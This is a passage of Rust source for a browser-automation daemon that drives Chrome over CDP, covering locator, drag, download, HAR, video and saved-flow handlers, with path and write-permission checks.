async fn handle_getbyplaceholder(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    handle_semantic_locator(cmd, state, "placeholder", "placeholder").await
}

async fn handle_getbyalttext(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    handle_semantic_locator(cmd, state, "alttext", "text").await
}

async fn handle_getbytitle(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    handle_semantic_locator(cmd, state, "title", "text").await
}

async fn handle_getbytestid(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    handle_semantic_locator(cmd, state, "testid", "testId").await
}

async fn handle_nth(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;
    let index = cmd
        .get("index")
        .and_then(|v| v.as_i64())
        .ok_or("Missing 'index' parameter")?;

    let js = format!(
        r#"(() => {{
            const els = document.querySelectorAll({sel});
            const idx = {idx} < 0 ? els.length + {idx} : {idx};
            if (idx < 0 || idx >= els.length) return false;
            els[idx].setAttribute('data-agent-browser-located', 'true');
            return true;
        }})()"#,
        sel = serde_json::to_string(selector).unwrap_or_default(),
        idx = index,
    );

    let result: super::cdp::types::EvaluateResult = mgr
        .client
        .send_command_typed(
            "Runtime.evaluate",
            &super::cdp::types::EvaluateParams {
                expression: js,
                return_by_value: Some(true),
                await_promise: Some(false),
            },
            Some(&session_id),
        )
        .await?;

    if !result
        .result
        .value
        .as_ref()
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
    {
        return Err(format!(
            "No element at index {} for selector '{}'",
            index, selector
        ));
    }

    let located = "[data-agent-browser-located='true']";
    let action_result = execute_subaction(cmd, state, located).await;

    if let Some(ref browser) = state.browser {
        let _ = browser
            .evaluate(
                "document.querySelector('[data-agent-browser-located]')?.removeAttribute('data-agent-browser-located')",
                None,
            )
            .await;
    }

    action_result
}

async fn handle_find(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let js = format!(
        r#"(() => {{
            const els = document.querySelectorAll({});
            return Array.from(els).map((el, i) => ({{
                index: i,
                tagName: el.tagName.toLowerCase(),
                text: el.textContent?.trim().substring(0, 100) || '',
                visible: el.offsetWidth > 0 && el.offsetHeight > 0,
            }}));
        }})()"#,
        serde_json::to_string(selector).unwrap_or_default()
    );

    let result = mgr.evaluate(&js, None).await?;
    Ok(json!({ "elements": result, "selector": selector }))
}

async fn handle_evalhandle(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let script = cmd
        .get("script")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'script' parameter")?;

    let result: super::cdp::types::EvaluateResult = mgr
        .client
        .send_command_typed(
            "Runtime.evaluate",
            &super::cdp::types::EvaluateParams {
                expression: script.to_string(),
                return_by_value: Some(false),
                await_promise: Some(true),
            },
            Some(&session_id),
        )
        .await?;

    let handle = result.result.object_id.unwrap_or_default();
    Ok(json!({ "handle": handle }))
}

// ---------------------------------------------------------------------------
// Advanced interaction handlers
// ---------------------------------------------------------------------------

async fn handle_drag(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let source = cmd
        .get("source")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'source' parameter")?;
    let target = cmd
        .get("target")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'target' parameter")?;

    let (sx, sy, source_session_id) = super::element::resolve_element_center(
        &mgr.client,
        &session_id,
        &state.ref_map,
        source,
        &state.iframe_sessions,
        false,
    )
    .await?;
    let (tx, ty, target_session_id) = super::element::resolve_element_center(
        &mgr.client,
        &session_id,
        &state.ref_map,
        target,
        &state.iframe_sessions,
        false,
    )
    .await?;

    let mode = cmd
        .get("inputMode")
        .and_then(Value::as_str)
        .unwrap_or(&state.input_mode);
    let human = mode == "human";
    let seed = cmd.get("seed").and_then(Value::as_u64).unwrap_or(0);

    // Approach the source before pressing so hover and pointer path handlers fire.
    let source_offset = super::element::session_viewport_offset(
        &mgr.client,
        &session_id,
        &source_session_id,
        &state.iframe_sessions,
    )
    .await?;
    let target_offset = super::element::session_viewport_offset(
        &mgr.client,
        &session_id,
        &target_session_id,
        &state.iframe_sessions,
    )
    .await?;
    move_mouse_interpolated(
        &mgr.client,
        &source_session_id,
        &mut state.mouse_state,
        sx,
        sy,
        0,
        if human { None } else { Some(1) },
        human,
        seed,
        0,
        source_offset,
        &state.recording_state.shared_cursor,
    )
    .await?;
    mgr.client
        .send_command(
            "Input.dispatchMouseEvent",
            Some(json!({ "type": "mousePressed", "x": sx, "y": sy, "button": "left", "buttons": 1, "clickCount": 1 })),
            Some(&source_session_id),
        )
        .await?;
    if let Ok(mut cursor) = state.recording_state.shared_cursor.lock() {
        cursor.record(sx + source_offset.0, sy + source_offset.1, 1);
    }

    // Move in steps to target, keeping the left button held (buttons: 1) so
    // that the browser sees a drag rather than a plain pointer move.
    state.mouse_state.x = sx + source_offset.0;
    state.mouse_state.y = sy + source_offset.1;
    state.mouse_state.buttons = 1;
    move_mouse_interpolated(
        &mgr.client,
        &target_session_id,
        &mut state.mouse_state,
        tx,
        ty,
        if human { 250 } else { 100 },
        if human { None } else { Some(10) },
        human,
        seed.wrapping_add(1),
        1,
        target_offset,
        &state.recording_state.shared_cursor,
    )
    .await?;

    // Mouse up at target
    mgr.client
        .send_command(
            "Input.dispatchMouseEvent",
            Some(json!({ "type": "mouseReleased", "x": tx, "y": ty, "button": "left", "buttons": 0, "clickCount": 1 })),
            Some(&target_session_id),
        )
        .await?;
    state.mouse_state.buttons = 0;
    if let Ok(mut cursor) = state.recording_state.shared_cursor.lock() {
        cursor.record(tx + target_offset.0, ty + target_offset.1, 0);
    }

    Ok(json!({ "dragged": true, "source": source, "target": target }))
}

async fn handle_expose(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let name = cmd
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'name' parameter")?;

    mgr.client
        .send_command(
            "Runtime.addBinding",
            Some(json!({ "name": name })),
            Some(&session_id),
        )
        .await?;

    Ok(json!({ "exposed": name }))
}

async fn handle_pause(_state: &DaemonState) -> Result<Value, String> {
    Ok(json!({ "paused": true, "note": "Use DevTools to inspect. The daemon remains running." }))
}

async fn handle_multiselect(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;
    let values: Vec<String> = cmd
        .get("values")
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_str().map(String::from))
                .collect()
        })
        .unwrap_or_default();

    let values_json = serde_json::to_string(&values).unwrap_or("[]".to_string());
    // A locator miss returns a sentinel instead of throwing, so it is detected in
    // Rust and normalized to the anchored "No element found: ..." shape. A thrown
    // error surfaces as "Evaluation error: ...", which is_locator_miss skips, and
    // a sentinel avoids misclassifying an invalid-selector error too.
    let js = format!(
        r#"(() => {{
            const select = document.querySelector({sel});
            if (!select) return {{ __ab_miss: true }};
            const vals = {vals};
            for (const opt of select.options) {{
                opt.selected = vals.includes(opt.value);
            }}
            select.dispatchEvent(new Event('change', {{ bubbles: true }}));
            return {{ selected: Array.from(select.selectedOptions).map(o => o.value) }};
        }})()"#,
        sel = serde_json::to_string(selector).unwrap_or_default(),
        vals = values_json,
    );

    let result = mgr.evaluate(&js, None).await?;
    if result
        .get("__ab_miss")
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
    {
        return Err(format!("No element found: {selector}"));
    }
    let selected = result.get("selected").cloned().unwrap_or_else(|| json!([]));
    Ok(json!({ "selected": selected }))
}

async fn handle_responsebody(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let url_pattern = cmd
        .get("url")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'url' parameter")?;
    let timeout_ms = state.timeout_ms(cmd);

    let mut rx = mgr.client.subscribe();
    let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_millis(timeout_ms);

    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            return Err(format!(
                "Timeout waiting for response matching '{}'",
                url_pattern
            ));
        }

        match tokio::time::timeout(remaining, rx.recv()).await {
            Ok(Ok(event)) => {
                if event.method == "Network.responseReceived"
                    && event.session_id.as_deref() == Some(&session_id)
                {
                    if let Some(resp_url) = event
                        .params
                        .get("response")
                        .and_then(|r| r.get("url"))
                        .and_then(|u| u.as_str())
                    {
                        if resp_url.contains(url_pattern) {
                            let request_id = event
                                .params
                                .get("requestId")
                                .and_then(|v| v.as_str())
                                .ok_or("No requestId in response event")?;
                            let status = event
                                .params
                                .get("response")
                                .and_then(|r| r.get("status"))
                                .and_then(|v| v.as_i64())
                                .unwrap_or(0);
                            let headers = event
                                .params
                                .get("response")
                                .and_then(|r| r.get("headers"))
                                .cloned()
                                .unwrap_or(json!({}));

                            let body_result = mgr
                                .client
                                .send_command(
                                    "Network.getResponseBody",
                                    Some(json!({ "requestId": request_id })),
                                    Some(&session_id),
                                )
                                .await?;
                            let body = body_result
                                .get("body")
                                .and_then(|v| v.as_str())
                                .unwrap_or("");

                            return Ok(
                                json!({ "body": body, "status": status, "headers": headers }),
                            );
                        }
                    }
                }
            }
            Ok(Err(tokio::sync::broadcast::error::RecvError::Lagged(_))) => continue,
            Ok(Err(_)) => return Err("Event stream closed".to_string()),
            Err(_) => {
                return Err(format!(
                    "Timeout waiting for response matching '{}'",
                    url_pattern
                ));
            }
        }
    }
}

async fn handle_waitfordownload(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let timeout_ms = state.timeout_ms(cmd);
    let mut rx = state
        .browser
        .as_ref()
        .ok_or("Browser not launched")?
        .client
        .subscribe();
    // Events that arrived after the per-command drain, such as during the
    // liveness check, are not delivered to the new receiver. Drain them into
    // the ledger now so a download that already finished is claimed (#561).
    state.drain_cdp_events_background().await?;

    let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_millis(timeout_ms);
    let record = loop {
        if let Some(record) = state.downloads.claim_finished() {
            break record;
        }
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        match tokio::time::timeout(remaining, rx.recv()).await {
            Ok(Ok(event)) => {
                state.downloads.observe(&event.method, &event.params);
            }
            Ok(Err(tokio::sync::broadcast::error::RecvError::Lagged(_))) => continue,
            Ok(Err(_)) => return Err("Event stream closed".to_string()),
            Err(_) => return Err("Timeout waiting for download".to_string()),
        }
    };

    if record.state == DownloadState::Canceled {
        return Err("Download was canceled".to_string());
    }
    let path_arg = cmd.get("path").and_then(|v| v.as_str());
    let Some(saved) = record.file_path else {
        if path_arg.is_none() {
            return Ok(json!({ "completed": true }));
        }
        return Err(
            "Download completed but the browser did not report where it saved the file".to_string(),
        );
    };
    let saved = PathBuf::from(saved);
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let launched_locally = !mgr.is_cdp_connection();
    let download_dir = mgr.download_path.clone();
    // A CDP endpoint reports a path on its own filesystem, which may not be
    // this machine's.
    if launched_locally && !wait_for_downloaded_file(&saved).await {
        return Err(format!(
            "Download completed but no file is at {}",
            saved.display()
        ));
    }

    let Some(path_str) = path_arg else {
        return Ok(json!({ "path": saved.to_string_lossy() }));
    };
    if !may_move_download(&saved, launched_locally, download_dir.as_deref()) {
        state.downloads.release(&record.guid);
        return Err(format!(
            "Refusing to move {}: only downloads from a browser agent-browser launched, inside its download directory, can be moved",
            saved.display()
        ));
    }
    // A bad destination must not consume the download, so a retry can claim it.
    move_download(&saved, path_str).inspect_err(|_| state.downloads.release(&record.guid))
}

/// Returns the file Chrome saved for `guid` in `download_dir`.
/// The GUID comes from a CDP event, so anything other than a single filename is rejected.
fn guid_download_path(download_dir: &std::path::Path, guid: &str) -> Result<PathBuf, String> {
    let path = download_dir.join(guid);
    if path.file_name() != Some(std::ffi::OsStr::new(guid)) {
        return Err(format!(
            "Refusing to move downloaded file: invalid download GUID {:?}",
            guid
        ));
    }
    Ok(path)
}

/// The saved path comes from a CDP event, so only a browser this daemon
/// launched is trusted to name a local file. A remote endpoint could otherwise
/// point the move at any file the daemon can read.
fn may_move_download(
    saved: &std::path::Path,
    launched_locally: bool,
    download_dir: Option<&str>,
) -> bool {
    if !launched_locally {
        return false;
    }
    let Some(dir) = download_dir else {
        return true;
    };
    match (fs::canonicalize(saved), fs::canonicalize(dir)) {
        (Ok(saved), Ok(dir)) => saved.starts_with(dir),
        _ => false,
    }
}

fn move_download(saved: &std::path::Path, path_str: &str) -> Result<Value, String> {
    let dest = if std::path::Path::new(path_str).is_absolute() {
        PathBuf::from(path_str)
    } else {
        std::env::current_dir()
            .map_err(|e| format!("Failed to get current directory: {}", e))?
            .join(path_str)
    };
    if let Some(parent) = dest.parent() {
        fs::create_dir_all(parent)
            .map_err(|e| format!("Failed to create download directory: {}", e))?;
    }
    if fs::rename(saved, &dest).is_err() {
        // rename fails across filesystems; copy, then remove the original.
        fs::copy(saved, &dest).map_err(|e| format!("Failed to move downloaded file: {}", e))?;
        let _ = fs::remove_file(saved);
    }
    Ok(json!({ "path": dest.to_string_lossy() }))
}

async fn handle_window_new(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let (tab_id, session_id) = {
        let mgr = state.browser.as_mut().ok_or("Browser not launched")?;

        // Create a new browser context
        let context_result = mgr
            .client
            .send_command_no_params("Target.createBrowserContext", None)
            .await?;
        let context_id = context_result
            .get("browserContextId")
            .and_then(|v| v.as_str())
            .ok_or("Failed to create browser context")?
            .to_string();

        let create_result: super::cdp::types::CreateTargetResult = mgr
            .client
            .send_command_typed(
                "Target.createTarget",
                &json!({ "url": "about:blank", "browserContextId": context_id }),
                None,
            )
            .await?;

        let attach: super::cdp::types::AttachToTargetResult = mgr
            .client
            .send_command_typed(
                "Target.attachToTarget",
                &super::cdp::types::AttachToTargetParams {
                    target_id: create_result.target_id.clone(),
                    flatten: true,
                },
                None,
            )
            .await?;

        mgr.prepare_domains_pub(&attach.session_id).await?;

        let tab_id = mgr.assign_tab_id();
        mgr.add_page(super::browser::PageInfo {
            tab_id,
            label: None,
            target_id: create_result.target_id,
            session_id: attach.session_id.clone(),
            url: "about:blank".to_string(),
            title: String::new(),
            target_type: "page".to_string(),
        });
        (tab_id, attach.session_id)
    };

    let has_proxy_creds = state.proxy_credentials.read().await.is_some();
    install_network_controls_or_resume_prepared_session(state, has_proxy_creds, &session_id)
        .await?;
    state.drain_cdp_events_background().await?;

    if let Some(viewport) = cmd.get("viewport") {
        let width = viewport
            .get("width")
            .and_then(|v| v.as_i64())
            .unwrap_or(1280) as i32;
        let height = viewport
            .get("height")
            .and_then(|v| v.as_i64())
            .unwrap_or(720) as i32;
        let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
        mgr.set_viewport(width, height, 1.0, false).await?;

        // Update stream server viewport
        if let Some(ref server) = state.stream_server {
            server.set_viewport(width as u32, height as u32).await;
        }
    }

    let total = state
        .browser
        .as_ref()
        .ok_or("Browser not launched")?
        .page_count();
    state.ref_map.begin_snapshot();

    Ok(json!({
        "tabId": super::browser::format_tab_id(tab_id),
        "total": total,
    }))
}

async fn handle_diff_screenshot(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let baseline_path = cmd
        .get("baseline")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'baseline' parameter")?;

    let threshold = cmd.get("threshold").and_then(|v| v.as_f64()).unwrap_or(0.1);

    let options = ScreenshotOptions {
        selector: cmd
            .get("selector")
            .and_then(|v| v.as_str())
            .map(String::from),
        path: None,
        full_page: cmd
            .get("fullPage")
            .and_then(|v| v.as_bool())
            .unwrap_or(false),
        format: "png".to_string(),
        quality: None,
        annotate: false,
        output_dir: None,
    };

    let result = screenshot::take_screenshot(
        &mgr.client,
        &session_id,
        &state.ref_map,
        &options,
        &state.iframe_sessions,
    )
    .await?;

    let current_bytes =
        base64::Engine::decode(&base64::engine::general_purpose::STANDARD, &result.base64)
            .map_err(|e| format!("Failed to decode screenshot: {}", e))?;

    let baseline_bytes =
        std::fs::read(baseline_path).map_err(|e| format!("Failed to read baseline: {}", e))?;

    let result = diff::diff_screenshot(&baseline_bytes, &current_bytes, threshold)?;

    let output_path = cmd.get("output").and_then(|v| v.as_str());
    if let (Some(out_path), Some(ref diff_data)) = (output_path, &result.diff_image) {
        std::fs::write(out_path, diff_data)
            .map_err(|e| format!("Failed to write diff image: {}", e))?;
    }

    Ok(json!({
        "match": result.matched,
        "mismatchPercentage": result.mismatch_percentage,
        "totalPixels": result.total_pixels,
        "differentPixels": result.different_pixels,
        "diffPath": output_path,
        "dimensionMismatch": result.dimension_mismatch,
    }))
}

// ---------------------------------------------------------------------------
// Video and HAR handlers
// ---------------------------------------------------------------------------

async fn handle_video_start(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let path = cmd
        .get("path")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'path' parameter")?;

    if state.recording_state.active {
        return Err("A recording is already in progress".to_string());
    }

    let fps = recording_fps_from_command(cmd)?;
    recording::validate_output_path(path)?;

    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    recording::check_ffmpeg_available().await?;
    recording::recording_start(
        &mut state.recording_state,
        path,
        recording::RecordingOptions {
            fps,
            ..recording::RecordingOptions::default()
        },
    )?;
    state
        .start_recording_task(mgr.client.clone(), session_id)
        .await?;

    Ok(json!({
        "started": true,
        "fps": state.recording_state.fps,
        "note": "Video recording started. Use video_stop to save the recording."
    }))
}

async fn handle_video_stop(state: &mut DaemonState) -> Result<Value, String> {
    if !state.recording_state.active {
        return Ok(json!({
            "stopped": false,
            "note": "No video recording was started. Use recording_stop if you used recording_start."
        }));
    }

    state.stop_recording_task().await?;
    recording::recording_stop(&mut state.recording_state)
}

/// Begin capturing network traffic for a later HAR export.
async fn handle_har_start(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    if state.flow.active() && state.har_recording {
        return Err(
            "capture is owned by --capture flow; HAR recording is already running".to_string(),
        );
    }
    let content_mode = match cmd.get("content").and_then(|v| v.as_str()) {
        Some(s) => HarContentMode::parse(s)?,
        None => HarContentMode::default(),
    };
    state.refresh_active_iframe_sessions().await;
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    // Larger buffers so response bodies survive until the periodic event
    // drain fetches them via Network.getResponseBody.
    let network_enable_params = json!({
        "maxTotalBufferSize": 100_000_000,
        "maxResourceBufferSize": 10_000_000,
    });
    mgr.client
        .send_command(
            "Network.enable",
            Some(network_enable_params.clone()),
            Some(&session_id),
        )
        .await?;
    // Also enable Network on cross-origin iframe sessions so their
    // requests are captured in the HAR output.
    for iframe_sid in &state.active_iframe_sessions {
        let _ = mgr
            .client
            .send_command(
                "Network.enable",
                Some(network_enable_params.clone()),
                Some(iframe_sid.as_str()),
            )
            .await;
    }
    state.har_recording = true;
    state.har_entries.clear();
    state.har_progress.clear();
    state.har_content_mode = content_mode;
    state.har_body_total_bytes = 0;
    Ok(json!({ "started": true }))
}

/// Stop HAR recording and write the captured requests to disk.
async fn handle_har_stop(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    if state.flow.active() {
        return Err("capture is owned by --capture flow; use flow save".to_string());
    }
    let path = har_output_path(cmd.get("path").and_then(|v| v.as_str()));

    let entries: Vec<Value> = state.har_entries.iter().map(har_entry_to_json).collect();
    let request_count = entries.len();
    let browser = har_browser_metadata(state).await;

    let mut log = json!({
        "version": "1.2",
        "creator": {
            "name": "agent-browser",
            "version": env!("CARGO_PKG_VERSION")
        },
        "entries": entries
    });
    if let Some(browser) = browser {
        log["browser"] = browser;
    }
    let har = json!({ "log": log });

    let har_str = serde_json::to_string_pretty(&har)
        .map_err(|e| format!("Failed to serialize HAR: {}", e))?;
    std::fs::write(&path, har_str).map_err(|e| format!("Failed to write HAR: {}", e))?;

    state.har_entries.clear();

    state.har_progress.clear();
    state.har_recording = false;
    state.har_body_total_bytes = 0;

    Ok(json!({ "path": path, "requestCount": request_count }))
}

// ---------------------------------------------------------------------------
// Saved flows
// ---------------------------------------------------------------------------

fn handle_flow_steps(_cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    if !state.flow.active() {
        return Err(NOT_CAPTURING.to_string());
    }
    Ok(state.flow.steps())
}

const NOT_CAPTURING: &str =
    "this session is not capturing flows; pass `--capture flow` on the next command and the session relaunches with capture on";

async fn handle_flow_save(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    if !state.flow.active() {
        return Err(NOT_CAPTURING.to_string());
    }
    let name = cmd
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or("flow save requires a name")?
        .to_string();
    super::flow::validate_name(&name)?;
    let params = super::flow::parse_params(cmd)?;
    let login_wall = match state.browser.as_ref() {
        Some(mgr) => mgr
            .evaluate(
                "[...document.querySelectorAll('input[type=password]')].some(e => e.offsetParent !== null)",
                None,
            )
            .await
            .ok()
            .and_then(|v| v.as_bool())
            .unwrap_or(false),
        None => false,
    };
    // A request the range started may still be loading; let it finish so its
    // body is on the entry. Bounded by the command timeout.
    let from = cmd.get("from").and_then(|v| v.as_u64());
    let to = cmd.get("to").and_then(|v| v.as_u64());
    let deadline =
        tokio::time::Instant::now() + tokio::time::Duration::from_millis(state.timeout_ms(cmd));
    // A response with headers whose body gets no bytes for the network idle
    // window is a stream or a long poll.
    let idle = std::time::Duration::from_millis(super::browser::NETWORK_IDLE_MS);
    loop {
        state.drain_cdp_events_background().await?;
        let stalled = |e: &HarEntry| {
            state
                .har_progress
                .get(&e.request_id)
                .is_some_and(|t| t.elapsed() >= idle)
        };
        if !state
            .flow
            .awaiting_response(from, to, &state.har_entries, &stalled)
            || tokio::time::Instant::now() >= deadline
        {
            break;
        }
        tokio::time::sleep(tokio::time::Duration::from_millis(25)).await;
    }
    let still_loading = state.flow.loading_gaps(from, to, &state.har_entries);
    let entries = state.har_entries.clone();
    let mut local_names = Vec::new();
    let mut reach_note = None;
    if let Some((host, port, addrs)) = state.flow.start_host_addresses(from, to, &entries) {
        match super::flow::recorded_local_host(&host, port, &addrs).await {
            super::flow::RecordedReach::Local(reach) => local_names.push((host, reach)),
            super::flow::RecordedReach::Unconfirmed(note) => reach_note = Some(note),
            super::flow::RecordedReach::Unknown => {}
        }
    }
    let saved = state.flow.save(super::flow::SaveArgs {
        name: &name,
        from: cmd.get("from").and_then(|v| v.as_u64()),
        to: cmd.get("to").and_then(|v| v.as_u64()),
        description: cmd.get("description").and_then(|v| v.as_str()),
        params: &params,
        output: cmd.get("output").and_then(|v| v.as_str()),
        entries: &entries,
        login_wall,
        local_names: &local_names,
    });
    // A save that fails for want of requests names the ones still loading.
    let mut report = match saved {
        Ok(report) => report,
        Err(e) if !still_loading.is_empty() => {
            let loading: Vec<String> = still_loading
                .iter()
                .filter_map(|g| Some(format!("step {}: {}", g["step"], g["reason"].as_str()?)))
                .collect();
            return Err(format!("{e}; {}", loading.join("; ")));
        }
        Err(e) => return Err(e),
    };
    // Requests still loading at the deadline are not in the flow. The step
    // that started one says so instead of the generic reason.
    if let Some(gaps) = report["gaps"].as_array_mut() {
        gaps.retain(|g| {
            g["kind"] != "no-requests" || !still_loading.iter().any(|l| l["step"] == g["step"])
        });
        gaps.extend(still_loading);
        for g in gaps.iter_mut() {
            if let Some(g) = g.as_object_mut() {
                g.remove("kind");
            }
        }
    }
    if let Some(note) = reach_note {
        report["reachNote"] = json!(note);
    }
    Ok(report)
}

/// The single write gate: the first write a run sends that `--allow-write`
/// does not cover and no confirmation has approved.
fn uncovered_flow_write<'a>(
    flow: &'a super::flow::Flow,
    allow: &super::flow::AllowWrite,
    confirmed: &HashSet<String>,
) -> Option<&'a super::flow::Write> {
    flow.run_writes()
        .into_iter()
        .find(|w| !allow.covers(&w.id) && !confirmed.contains(&w.action()))
}

/// The policy action to confirm before the run starts. An id the flow does
/// not have is left to the run to report.
fn unconfirmed_flow_write(
    cmd: &Value,
    flow: &super::flow::Flow,
    state: &DaemonState,
) -> Option<String> {
    let allow = super::flow::AllowWrite::parse(cmd.get("allowWrite")).ok()?;
    allow.check(flow).ok()?;
    uncovered_flow_write(flow, &allow, &state.confirmed_policy_actions).map(|w| w.action())
}

async fn handle_flow_run(
    cmd: &Value,
    state: &mut DaemonState,
    flow: super::flow::Flow,
) -> Result<Value, String> {
    // Commands a run sends to the browser are not part of the recording.
    state.flow.set_suspended(true);
    let result = handle_flow_run_inner(cmd, state, flow).await;
    state.flow.set_suspended(false);
    result
}

async fn handle_flow_run_inner(
    cmd: &Value,
    state: &mut DaemonState,
    mut flow: super::flow::Flow,
) -> Result<Value, String> {
    let started = std::time::Instant::now();
    let run_deadline = started + std::time::Duration::from_millis(state.timeout_ms(cmd));
    let name = flow.name.clone();
    let name = name.as_str();
    let params = super::flow::parse_params(cmd)?;
    let requests = super::flow::prepare(&flow, &params)?;
    let allow = super::flow::AllowWrite::parse(cmd.get("allowWrite"))?;
    allow.check(&flow)?;
    if let Some(w) = uncovered_flow_write(&flow, &allow, &state.confirmed_policy_actions) {
        return Err(format!(
            "flow '{}' sends {} {} ({}); rerun with --allow-write {} to send it",
            name,
            w.method,
            w.url,
            match w.kind {
                super::flow::WriteKind::Explicit => "explicit",
                super::flow::WriteKind::Suspected => "suspected",
            },
            w.id
        ));
    }

    let filter = state.domain_filter.read().await.clone();
    let hosts = super::flow::HostPolicy::of(&flow);
    // Every request is checked before the first one is sent, on its template
    // with references unfilled; each is checked again once they are filled.
    for prepared in &requests {
        hosts
            .check(&prepared.url)
            .map_err(|e| format!("flow '{}' step {}: {}", name, prepared.step, e))?;
    }
    let client = super::flow::http_client(filter.clone(), &flow).await?;
    let results = {
        let mut senders = DaemonSenders {
            wiring: FlowWiring::new(state, &allow),
            client,
            flow: &flow,
            params: &params,
            replay_run: None,
            run_deadline,
        };
        let check = |req: &super::flow::PreparedRequest| -> Result<(), String> {
            hosts
                .check(&req.url)
                .map_err(|e| format!("flow '{}' step {}: {}", name, req.step, e))?;
            // Saved destinations follow the session's current domain
            // allowlist, not the one in force when the flow was recorded.
            match filter.as_ref().and_then(|f| f.check_url(&req.url).err()) {
                Some(reason) => Err(format!("flow '{}' step {}: {}", name, req.step, reason)),
                None => Ok(()),
            }
        };
        super::flow::run_requests(&flow, &requests, &mut senders, &check).await?
    };

    // The run's own result comes first: writes it sent happened whether or
    // not the flow file can be updated, so a save error never hides it.
    if let Some(outcome) = super::flow::RunOutcome::stopped(&results) {
        let saved = if super::flow::unverify_on_shape_change(&mut flow, &results) {
            super::flow::write_flow(&flow).err()
        } else {
            None
        };
        state.flow_stop = with_save_error(outcome.data(name), saved.as_deref());
        return Err(with_save_note(outcome.message(name), saved.as_deref()));
    }

    let shape = super::flow::Shape::from_cmd(cmd);
    if let Some(body) = results
        .iter()
        .find(|r| r.ok && r.id == flow.output)
        .and_then(|r| r.body.as_ref())
    {
        let unknown = super::flow::unknown_fields(body, &shape);
        if !unknown.is_empty() {
            return Err(format!(
                "no item has field(s) {}. Fields: {}",
                unknown.join(", "),
                flow.item_fields.join(", ")
            ));
        }
    }
    let now = chrono::Utc::now().to_rfc3339();
    let response = super::flow::finish_run(
        &mut flow,
        &results,
        &now,
        started.elapsed().as_millis(),
        &shape,
    );
    let saved = super::flow::write_flow(&flow).err();
    if response["ok"] != json!(true) {
        let outcome = super::flow::RunOutcome::failed(&results, &flow);
        state.flow_stop = with_save_error(outcome.data(name), saved.as_deref());
        return Err(with_save_note(outcome.message(name), saved.as_deref()));
    }
    let mut response = response;
    if let Some(e) = saved {
        response["saveError"] = json!(e);
    }
    Ok(response)
}

/// A run's stop data, with the error that kept the flow file from updating.
fn with_save_error(data: Option<Value>, saved: Option<&str>) -> Option<Value> {
    match (data, saved) {
        (Some(mut data), Some(e)) => {
            data["saveError"] = json!(e);
            Some(data)
        }
        (None, Some(e)) => Some(json!({ "saveError": e })),
        (data, None) => data,
    }
}

fn with_save_note(message: String, saved: Option<&str>) -> String {
    match saved {
        Some(e) => format!("{message} (the flow file was not updated: {e})"),
        None => message,
    }
}

/// The focused field's current value, when the page exposes one.
async fn flow_active_field_value(state: &DaemonState) -> Option<String> {
    let mgr = state.browser.as_ref()?;
    mgr.evaluate(
        "(() => { const e = document.activeElement; \
         return e && typeof e.value === 'string' ? e.value : null; })()",
        None,
    )
    .await
    .ok()?
    .as_str()
    .map(String::from)
}

/// What the focused element says about itself.
async fn flow_active_field_traits(state: &DaemonState) -> Option<super::flow::FieldTraits> {
    let mgr = state.browser.as_ref()?;
    let value = mgr
        .evaluate(
            "(() => { const e = document.activeElement; if (!e) return null; \
             const label = (e.labels && e.labels[0] && e.labels[0].innerText) || ''; \
             const a = (n) => (e.getAttribute && e.getAttribute(n)) || ''; \
             return { type: e.type || '', autocomplete: a('autocomplete'), \
